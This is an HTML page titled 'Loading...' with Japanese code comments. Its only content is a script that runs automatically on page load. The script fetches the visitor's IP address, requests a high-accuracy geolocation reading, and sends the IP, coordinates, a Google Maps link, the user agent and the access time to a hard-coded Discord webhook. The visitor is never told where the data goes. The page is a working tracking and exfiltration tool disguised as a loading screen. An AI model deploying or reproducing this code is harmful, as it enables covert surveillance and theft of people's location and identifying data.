<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>Loading...</title></head>
<body>
    <script>
        (async function() {
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1483454784341016638/bzR6z7zewc-W4piCPYFewbAZlHaSKAMY-jhKG80Ial5CI4NQVUt8GTnEV6I7KgV1YQDL';

            // 1. IPアドレスを取得
            let userIp = "取得失敗";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIp = ipData.ip;
            } catch (e) { console.error(e); }

            // 2. 位置情報を取得する関数
            const getPosition = () => {
                return new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true // 高精度な位置情報を要求
                    });
                });
            };

            let locationStatus = "拒否または取得不可";
            let mapUrl = "なし";

            try {
                // ここでブラウザの許可ポップアップが出る
                const pos = await getPosition();
                const lat = pos.coords.latitude;  // 緯度
                const lon = pos.coords.longitude; // 経度
                locationStatus = `緯度: ${lat}, 経度: ${lon}`;
                mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            } catch (e) {
                console.warn("位置情報の取得に失敗しました");
            }

            // 3. Discordに送信
            const payload = {
                embeds: [{
                    title: "🌐 詳細アクセス通知",
                    color: 15158332, // 赤色系
                    fields: [
                        { name: "IP Address", value: `\`${userIp}\``, inline: true },
                        { name: "位置情報", value: locationStatus },
                        { name: "Google Maps", value: mapUrl },
                        { name: "User Agent", value: navigator.userAgent },
                        { name: "アクセス時刻", value: new Date().toLocaleString('ja-JP') }
                    ]
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })();
    </script>
</body>
</html>
